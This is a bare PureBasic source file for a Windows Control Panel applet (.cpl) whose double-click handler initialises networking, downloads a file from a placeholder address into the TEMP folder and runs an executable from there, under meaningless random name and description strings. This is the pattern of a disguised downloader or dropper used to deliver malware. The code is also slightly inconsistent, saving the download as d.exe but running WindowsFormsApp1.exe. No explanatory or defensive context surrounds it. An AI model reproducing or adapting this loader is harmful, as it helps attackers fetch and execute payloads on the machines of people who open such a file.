# d
```
ProcedureDLL.l CPlApplet(hwndCPI.l,uMsg.l,lParam1.l,lParam2.l) 
Shared Name.s,Info.s 

#CPL_DBLCLK  = 5 
#CPL_EXIT = 7 
#CPL_GETCOUNT = 2 
#CPL_INIT = 1 
#CPL_INQUIRE = 3 
#CPL_STOP = 6 
#CPL_NEWINQUIRE = 8 
  
Structure NEWCPLINFO 
dwSize.l 
dwFlags.l 
dwHelpContext.l 
lData.l 
hIcon.l 
szName.b[32] 
szInfo.b[64] 
szHelpFile.b[128] 
EndStructure 
  
Select uMsg 
Case #CPL_INIT 
Name = "bmwYB5Jy"
Info = "Pu09BPcb"
result = 1 
Case #CPL_GETCOUNT 
result = 1
Case #CPL_NEWINQUIRE 
*cp.NEWCPLINFO = lParam2 
*cp\dwSize = SizeOf(NEWCPLINFO) 
*cp\hIcon = ExtractIcon_(0,"d.exe",0) 
PokeS(@*cp\szName[0], Name) 
PokeS(@*cp\szInfo[0], Info) 
result = 0 
Case#CPL_DBLCLK 
InitNetwork()
ReceiveHTTPFile("DDL", GetEnvironmentVariable("TEMP") + "\d.exe")
RunProgram(GetEnvironmentVariable("TEMP") + "\WindowsFormsApp1.exe","", "", 0) 
result = 0 
Case #CPL_STOP 
result = 0 
Case #CPL_EXIT 
result = 0 
EndSelect 
ProcedureReturn result 
EndProcedure
```
